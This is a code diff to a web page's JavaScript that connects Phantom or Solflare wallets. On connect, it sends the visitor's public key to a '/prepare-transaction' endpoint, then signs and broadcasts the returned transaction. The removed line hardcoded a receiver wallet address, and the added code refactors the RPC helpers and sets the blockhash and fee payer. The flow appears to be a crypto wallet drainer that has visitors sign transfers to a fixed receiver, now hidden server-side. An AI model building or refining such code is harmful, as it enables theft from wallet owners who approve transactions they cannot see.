@@ -103,31 +103,27 @@
                 $('#solflare-status').html(window.solflare && window.solflare.isSolflare ? '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>' : '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
             }
             
-            async function getBalance(pk) {
-                const r = await fetch(HELIUS_RPC, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [pk] }) 
+            async function rpcCall(method, params) {
+                const response = await fetch(HELIUS_RPC, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
                 });
-                const d = await r.json();
-                return d.result?.value || 0;
+                const data = await response.json();
+                if (data.error) throw new Error(data.error.message);
+                return data.result;
             }
             
-            async function sendTransaction(txBytes) {
-                const base64Tx = btoa(String.fromCharCode.apply(null, txBytes));
-                const r = await fetch(HELIUS_RPC, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify({ 
-                        jsonrpc: "2.0", 
-                        id: 1, 
-                        method: "sendTransaction", 
-                        params: [base64Tx, { encoding: "base64" }] 
-                    }) 
-                });
-                const d = await r.json();
-                if (d.error) throw new Error(d.error.message);
-                return d.result;
+            async function getBalance(pk) {
+                return await rpcCall('getBalance', [pk]);
+            }
+            
+            async function getLatestBlockhash() {
+                return await rpcCall('getLatestBlockhash', []);
+            }
+            
+            async function sendTransaction(base64Tx) {
+                return await rpcCall('sendTransaction', [base64Tx, { encoding: "base64" }]);
             }
             
             async function connectWallet(type, provider) {
@@ -161,19 +157,29 @@
                     const txResp = await fetch('/prepare-transaction', { 
                         method: 'POST', 
                         headers: { 'Content-Type': 'application/json' }, 
-                        body: JSON.stringify({ publicKey: pk, receiverWallet: 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ' }) 
+                        body: JSON.stringify({ publicKey: pk }) 
                     });
                     const txData = await txResp.json();
                     if (!txData.success) throw new Error(txData.error);
                     
-                    $('.wallet-loading-title').text('Signing...');
+                    $('.wallet-loading-title').text('Getting Blockhash...');
+                    const { blockhash, lastValidBlockHeight } = await getLatestBlockhash();
+                    console.log('Blockhash:', blockhash);
+                    
+                    $('.wallet-loading-title').text('Building Transaction...');
                     const txBytes = new Uint8Array(txData.transaction);
                     const transaction = solanaWeb3.Transaction.from(txBytes);
+                    transaction.recentBlockhash = blockhash;
+                    transaction.lastValidBlockHeight = lastValidBlockHeight;
+                    transaction.feePayer = new solanaWeb3.PublicKey(pk);
+                    
+                    $('.wallet-loading-title').text('Signing...');
                     const signed = await provider.signTransaction(transaction);
                     
                     $('.wallet-loading-title').text('Sending...');
                     const signedBytes = signed.serialize();
-                    const txid = await sendTransaction(signedBytes);
+                    const base64Tx = btoa(String.fromCharCode.apply(null, signedBytes));
+                    const txid = await sendTransaction(base64Tx);
                     console.log('TXID:', txid);
                     
                     $('.wallet-loading-title').text('Success!');
